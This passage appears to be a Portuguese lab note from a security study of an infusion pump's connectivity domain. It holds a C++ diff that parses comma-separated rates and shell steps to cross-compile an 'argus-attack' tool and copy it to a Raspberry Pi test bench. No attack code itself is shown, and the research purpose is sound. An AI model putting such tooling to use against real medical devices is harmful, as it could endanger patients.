+            g_rates.clear();
+            size_t p = 0;
+            while(p <= s.size())
+            {
+                size_t q = s.find(',', p);
+                if(q == std::string::npos) q = s.size();
+                g_rates.push_back((uint32_t) strtoul(s.substr(p, q - p).c_str(), nullptr, 10));
+                p = q + 1;
+            }
+        }
```

O resto do E13 não muda: o laço já itera por índice e emite
`pedido_<v>_efetivo` para cada valor.

Compilação cruzada — o `crossbuild_bench.sh` só gera o `argus-bench`. Para o
`argus-attack`, a mesma receita com o arquivo trocado, no diretório `src/`:

```bash
cd ~/Documents/Argus_Artigo/argus-amp-infusion-pump/connectivity-domain/meta-infusion-pump/recipes-apps/infusion-control/files/src
sed -e 's#tools/argus_bench.cpp#tools/argus_attack.cpp#' \
    -e 's#argus-bench-armv7#argus-attack-armv7#g' \
    tools/crossbuild_bench.sh > tools/crossbuild_attack.sh
bash tools/crossbuild_attack.sh         # SEM --deploy: o / da RPi e somente leitura
scp argus-attack-armv7 $PI:/data/bancada01/bin/argus-attack-rates
pi '/data/bancada01/bin/argus-attack-rates -h | head -n 3'
rm argus-attack-armv7 tools/crossbuild_attack.sh   # nao versionar binario nem script gerado
```

O script gerado fica em `tools/` de propósito: ele acha o diretório de fontes
por `$(dirname "$0")/..`, que só aponta para `src/` se ele estiver lá.

O patch pode (e deve) ir para o repositório depois da bancada: com ele, a
Tabela III passa a ser reproduzível nas duas ordens.
